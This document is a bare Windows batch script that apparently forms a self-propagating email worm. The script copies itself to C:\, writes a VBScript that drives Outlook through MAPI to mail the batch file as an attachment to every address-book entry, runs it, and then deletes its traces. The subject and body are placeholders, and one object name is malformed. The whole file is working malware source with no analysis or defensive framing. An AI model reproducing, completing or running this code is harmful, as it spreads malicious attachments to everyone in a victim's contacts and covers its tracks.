copy %0 C:\ATTACHMENT.bat
copy %0 C:\kvqim.vbs
echo Dim x > C:\kvqim.vbs
echo.on error resume next >> C:\kvqim.vbs
echo Set fso =" Scripting.FileSystem.Object" >> C:\kvqim.vbs
echo Set so=CreateObject(fso) >> C:\kvqim.vbs
echo Set ol=CreateObject("Outlook.Application") >> C:\kvqim.vbs
echo Set out=WScript.CreateObject("Outlook.Application") >> C:\kvqim.vbs
echo Set mapi = out.GetNameSpace("MAPI") >> C:\kvqim.vbs
echo Set a = mapi.AddressLists(1) >> C:\kvqim.vbs
echo Set ae=a.AddressEntries >> C:\kvqim.vbs
echo For x=1 To ae.Count >> C:\kvqim.vbs
echo Set ci=ol.CreateItem(0) >> C:\kvqim.vbs
echo Set Mail=ci >> C:\kvqim.vbs
echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) >> C:\kvqim.vbs
echo Mail.Subject="SUBJECT" >> C:\kvqim.vbs
echo Mail.Body="BODY" >> C:\kvqim.vbs
echo Mail.Attachments.Add("C:\ATTACHMENT.bat") >> C:\kvqim.vbs
echo Mail.Send >> C:\kvqim.vbs
echo Next >> C:\kvqim.vbs
echo ol.Quit >> C:\kvqim.vbs
cscript C:\kvqim.vbs
del C:\kvqim.vbs
del C:\ATTACHMENT.bat